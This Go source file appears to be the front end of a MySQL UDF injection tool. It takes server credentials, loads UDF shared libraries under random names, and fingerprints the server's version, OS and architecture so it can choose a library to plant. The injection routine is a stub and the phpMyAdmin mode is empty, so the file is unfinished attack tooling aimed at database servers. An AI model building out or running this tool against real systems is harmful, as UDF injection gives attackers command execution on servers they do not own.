package main

import (
	"flag"
	"fmt"
	"io/ioutil"

	"github.com/pelletier/go-toml"

	"github.com/For-ACGN/udf-injecter"
)

func main() {
	var (
		mode     string // "direct", "pma"(phpMyAdmin)
		host     string
		username string
		password string
		config   string
	)
	flag.StringVar(&mode, "m", "direct", "inject method: direct or pma")
	flag.StringVar(&host, "h", "127.0.0.1:3306", "MySQL Server address or phpMyAdmin URL")
	flag.StringVar(&username, "u", "root", "MySQL Server username")
	flag.StringVar(&password, "p", "", "MySQL Server password")
	flag.StringVar(&config, "c", "config.toml", "config file path")
	flag.Parse()
	// load config
	cfgData, err := ioutil.ReadFile(config)
	if err != nil {
		fmt.Print(err)
		return
	}
	cfg := struct {
		UDF  map[string]string
		Func []*injecter.Func
	}{}
	err = toml.Unmarshal(cfgData, &cfg)
	if err != nil {
		fmt.Print(err)
		return
	}
	// load UDFs
	udf := make(map[string]*injecter.UDF)
	for t, path := range cfg.UDF {
		data, err := ioutil.ReadFile(path)
		if err != nil {
			fmt.Print(err)
			return
		}
		udf[t] = &injecter.UDF{
			// "xxxxxxxx.xxx"
			Name: injecter.RandomStr(8) + "." + injecter.RandomStr(3),
			Data: data,
		}
	}
	// connect host
	var handle injecter.Handle
	switch mode {
	case "direct":
		handle, err = injecter.Connect(host, username, password)
		if err != nil {
			fmt.Print(err)
			return
		}
	case "pma":
		return
	default:
		fmt.Print("unknown inject mode")
		return
	}
	// start inject
	if len(udf) == 0 || len(cfg.Func) == 0 {
		fmt.Print("[!] no UDF or no Functions")
		return
	}
	if !injecter.IsDynamic(handle) {
		fmt.Print("[!] not dynamic")
		return
	}
	// select inject method
	version, err := injecter.GetVersion(handle)
	if err != nil {
		fmt.Println("[!]", err)
		return
	}
	fmt.Println("[+] version:", version)
	ver, err := injecter.ParseVersion(version)
	if err != nil {
		fmt.Println("[!]", err)
		return
	}
	// select inject udf
	os, err := injecter.GetOS(handle)
	if err != nil {
		fmt.Println("[!]", err)
		return
	}
	arch, err := injecter.GetMachine(handle)
	if err != nil {
		fmt.Println("[!]", err)
		return
	}
	fmt.Println("[+] OS&Arch:", os+"_"+arch)
	udfData, ok := udf[os+"_"+arch]
	if !ok { // try all udf
		fmt.Println("[!] no compare")
		for _, u := range udf {
			// version < 5.1.xx
			if ver < 501 {
				err = injectUDF(handle, u, cfg.Func, false)
				if err == nil {
					return
				}
				fmt.Println("[!] no compare")
			} else { // include MariaDB
				err = injectUDF(handle, u, cfg.Func, true)
				if err == nil {
					return
				}
				fmt.Println("[!] no compare")
			}
		}
		fmt.Println("[-] no compare")
		return
	}
	if ver < 501 {
		injectUDF(handle, udfData, cfg.Func, false)
	} else {
		injectUDF(handle, udfData, cfg.Func, true)
	}
}

func injectUDF(handle injecter.Handle, udf *injecter.UDF, funcs []*injecter.Func, v51 bool) error {
	return nil
}
